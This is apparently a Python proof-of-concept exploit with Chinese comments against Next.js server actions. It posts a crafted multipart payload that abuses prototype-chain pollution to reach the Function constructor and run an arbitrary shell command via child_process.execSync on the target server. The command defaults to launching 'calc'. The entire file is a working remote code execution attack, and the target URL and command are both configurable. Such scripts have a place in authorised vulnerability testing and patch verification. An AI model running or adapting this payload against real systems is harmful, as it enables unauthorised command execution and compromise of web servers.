import requests
import sys
import json

# 设置基础URL配置
# 从命令行参数获取基础URL，如果未提供则使用默认值"http://localhost:3000"
BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"

# 从命令行参数中获取可执行文件名，如果未提供则默认使用"calc"
# 该代码通过检查sys.argv的长度来判断是否提供了足够的命令行参数
# 如果len(sys.argv) > 2，则使用sys.argv[2]作为可执行文件名
# 否则使用默认值"calc"作为可执行文件名
# EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "calc"
EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "calc"

# 构造恶意载荷数据，利用原型链污染漏洞执行命令
crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"process.mainModule.require('child_process').execSync('{EXECUTABLE}');",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

# 构造文件上传数据，将载荷包装成文件形式
files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}

# 设置请求头，指定Next.js的动作类型
headers = {"Next-Action": "x"}

# 发送POST请求，尝试触发服务端漏洞执行命令

try:
    res = requests.post(BASE_URL, files=files, headers=headers, timeout=20)
    print(res.status_code)
    print(res.text)

except requests.exceptions.ReadTimeout:
    print("请求超时，请检查目标服务是否正常运行。")
except requests.exceptions.ConnectionError:
    print("无法连接到目标服务，请确认服务地址和端口是否正确。")
